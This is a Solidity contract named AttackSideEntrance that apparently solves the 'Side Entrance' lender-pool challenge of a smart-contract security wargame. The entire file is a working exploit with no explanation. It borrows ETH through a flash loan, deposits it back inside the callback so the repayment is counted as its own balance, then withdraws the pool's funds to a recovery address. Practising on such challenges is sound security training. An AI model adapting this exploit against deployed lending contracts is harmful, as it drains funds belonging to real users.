// SPDX-License-Identifier: MIT

pragma solidity ^0.8.25;
import {SafeTransferLib} from "solady/utils/SafeTransferLib.sol";
import {SideEntranceLenderPool} from "./SideEntranceLenderPool.sol";

contract AttackSideEntrance {

	SideEntranceLenderPool public immutable _pool;

	constructor( SideEntranceLenderPool pool )
	{
		_pool = pool;
	}

	function attack( address recovery, uint256 amount ) external
	{
		( bool success, bytes memory rdata ) = address(_pool).call( abi.encodeWithSignature( "flashLoan(uint256)", amount ) );
		if ( !success && rdata.length == 0 )
			revert("revert0");
		( success, rdata) = address(_pool).call( abi.encodeWithSignature( "withdraw()" ) );
		if ( !success && rdata.length == 0 )
			revert("revert1");
		SafeTransferLib.safeTransferETH(recovery, amount);
	}

	function execute() external payable{
		( bool success, bytes memory rdata ) = address(_pool).call{ value: msg.value }( abi.encodeWithSignature("deposit()") );
		if ( !success && rdata.length == 0 )
			revert("revert1");
	}
	
	receive() external payable {}
}